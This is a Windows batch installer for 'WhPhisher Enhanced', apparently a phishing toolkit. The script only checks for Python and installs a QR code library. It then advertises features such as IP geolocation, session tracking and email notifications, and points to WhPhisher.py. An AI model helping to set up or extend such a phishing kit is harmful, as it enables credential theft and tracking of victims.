@echo off
REM Enhanced WhPhisher - Optional Dependencies Installer (Windows)
REM This script installs optional Python packages for enhanced features

echo ==================================
echo WhPhisher Enhanced - Dependencies
echo ==================================
echo.

REM Check Python
where python >nul 2>nul
if %ERRORLEVEL% EQU 0 (
    set PYTHON=python
    set PIP=pip
) else (
    echo [ERROR] Python is not installed!
    pause
    exit /b 1
)

echo [*] Python found: %PYTHON%
echo.

REM Install QR Code library
echo [+] Installing QR Code library...
%PIP% install qrcode[pil] >nul 2>&1
if %ERRORLEVEL% EQU 0 (
    echo [✓] QR Code library installed
) else (
    echo [!] QR Code library may already be installed
)

echo.
echo ==================================
echo [✓] Installation Complete!
echo ==================================
echo.
echo Features enabled:
echo   ✓ QR Code generation
echo   ✓ Timestamp logging
echo   ✓ IP Geolocation
echo   ✓ JSON/CSV export
echo   ✓ Email notifications
echo   ✓ Session tracking
echo   ✓ Statistics dashboard
echo.
echo Configuration file: whphisher_config.ini
echo Documentation: ENHANCED_FEATURES.md
echo.
echo Run: python WhPhisher.py
echo.
pause
